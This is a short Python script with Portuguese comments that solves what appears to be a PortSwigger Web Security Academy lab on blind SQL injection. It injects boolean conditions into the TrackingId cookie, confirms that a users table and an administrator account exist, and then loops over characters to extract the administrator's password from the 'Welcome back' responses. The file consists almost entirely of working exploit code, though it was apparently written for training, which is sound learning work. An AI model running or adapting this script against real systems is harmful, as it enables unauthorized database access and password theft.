import requests

# Parâmetro vulnerável: Cookies -> TrackingId

# PAYLOADS
# Teste de vulnerabilidade condicional
sqli_1 = "' AND '1'='1" # Condição Verdadeira, aplicação retorna 'Welcome back'
sqli_2 = "' AND '1'='2" # Condição Falsa, aplicação não retorna 'Welcome back'
# Verificando existência da tabela users e do usuário 'administrator'
sqli_3 = "' AND (SELECT 'a' FROM users LIMIT 1) = 'a" 
sqli_4 = "' AND (SELECT 'a' FROM users WHERE username = 'administrator') = 'a" 

url = 'https://0af0002004b2912580c24e3200b80077.web-security-academy.net'
# Request para os payloads de sqli_1 até sqli_4
'''
cookies = {
    'TrackingId': 'aAqKn4p1fCtjY6E1' + sqli_4,
}
response = requests.get(url, cookies=cookies) 

if "Welcome back" in response.text:
    print("Condição verdadeira")
else:
    print("Condição falsa")
'''

# Sequência de requests para o payload sqli_5
caracteres = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9']
password = []
for i in range(1,21): # Percorre de 1 a 20
    for j in caracteres:
        # Capturando caracteres da password do administrator 
        sqli_5 = "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator')," + str(i) + ",1) = '" + j
        cookies = {
            'TrackingId': 'aAqKn4p1fCtjY6E1' + sqli_5,
        }
        response = requests.get(url, cookies=cookies)
        if "Welcome back" in response.text:
            password.append(j)
    
print("Password: " + "".join(password))